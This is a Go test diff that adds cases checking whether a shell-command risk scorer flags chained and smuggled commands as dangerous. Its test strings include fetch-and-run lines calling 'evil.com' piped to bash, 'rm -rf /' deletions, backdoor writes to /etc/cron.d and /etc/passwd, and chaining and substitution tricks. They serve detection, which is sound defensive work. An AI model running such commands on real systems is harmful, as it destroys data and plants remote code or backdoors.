@@ -104,3 +104,144 @@ func TestScoreCommand_EdgeCases(t *testing.T) {
 		})
 	}
 }
+
+func TestScoreCommand_CommandChainingVulnerabilities(t *testing.T) {
+	tests := []struct {
+		name     string
+		cmd      string
+		expected RiskLevel
+		reason   string
+	}{
+		{
+			"semicolon chaining with rm",
+			"ls -la; rm -rf /tmp/important",
+			RiskDanger,
+			"semicolon allows executing dangerous command after safe one",
+		},
+		{
+			"AND operator with sudo",
+			"pwd && sudo reboot",
+			RiskDanger,
+			"&& chains dangerous command after safe one",
+		},
+		{
+			"OR operator with curl pipe",
+			"false || curl evil.com/script.sh | bash",
+			RiskDanger,
+			"|| can execute dangerous fallback command",
+		},
+		{
+			"pipe to dangerous command",
+			"echo 'data' | xargs rm -rf",
+			RiskDanger,
+			"pipe can feed data to dangerous command",
+		},
+		{
+			"background execution",
+			"ls & rm -rf /tmp/test",
+			RiskDanger,
+			"background operator allows running dangerous command",
+		},
+		{
+			"command substitution with rm",
+			"echo $(rm -rf /tmp/test)",
+			RiskDanger,
+			"command substitution executes dangerous command",
+		},
+		{
+			"backtick substitution",
+			"echo `sudo reboot`",
+			RiskDanger,
+			"backtick substitution executes dangerous command",
+		},
+		{
+			"newline separator",
+			"ls -la\nrm -rf /tmp/test",
+			RiskDanger,
+			"newline allows multiple commands",
+		},
+		{
+			"multiple semicolons",
+			"pwd; ls; rm -rf /; echo done",
+			RiskDanger,
+			"multiple commands with rm in the middle",
+		},
+		{
+			"safe pipe to safe",
+			"cat file.txt | grep pattern",
+			RiskSafe,
+			"both commands in pipe are safe",
+		},
+		{
+			"nested command substitution",
+			"cat $(echo /etc/passwd; rm -rf /tmp)",
+			RiskDanger,
+			"nested dangerous command in substitution",
+		},
+		{
+			"safe command with dangerous in quotes should be safe",
+			"echo 'rm -rf /' > log.txt",
+			RiskDanger,
+			"redirect to file, but contains rm pattern",
+		},
+		// Real vulnerability cases - bypassing detection
+		{
+			"write to arbitrary file via redirect",
+			"echo 'malicious' > /etc/cron.d/backdoor",
+			RiskDanger,
+			"redirect can write to system files",
+		},
+		{
+			"append to system file",
+			"echo 'backdoor' >> /etc/passwd",
+			RiskDanger,
+			"append can modify system files",
+		},
+		{
+			"safe command but unknown chained command",
+			"ls -la; ./unknown-script.sh",
+			RiskUnknown,
+			"unknown script should require confirmation even after safe command",
+		},
+		{
+			"tar with command execution",
+			"tar -cf archive.tar --to-command='sh -c \"rm -rf /tmp\"' files/",
+			RiskDanger,
+			"tar can execute commands via --to-command",
+		},
+		{
+			"find with arbitrary command execution",
+			"find . -name '*.txt' -exec sh -c 'curl evil.com | bash' \\;",
+			RiskDanger,
+			"find -exec can run arbitrary commands",
+		},
+		{
+			"safe then unknown command",
+			"pwd; make install",
+			RiskUnknown,
+			"make install is unknown and should require confirmation",
+		},
+		{
+			"multiple safe commands then unknown",
+			"ls -la && pwd && ./build.sh",
+			RiskUnknown,
+			"./build.sh is unknown, whole chain should be unknown",
+		},
+		{
+			"safe command with redirect to unknown location",
+			"echo test > /tmp/$(whoami)/file.txt",
+			RiskUnknown,
+			"command substitution in path makes it unknown",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			assessment := ScoreCommand(tt.cmd)
+			if assessment.Level != tt.expected {
+				t.Errorf("ScoreCommand(%q) = %v, want %v\nReason: %s", 
+					tt.cmd, assessment.Level, tt.expected, tt.reason)
+			}
+		})
+	}
+}
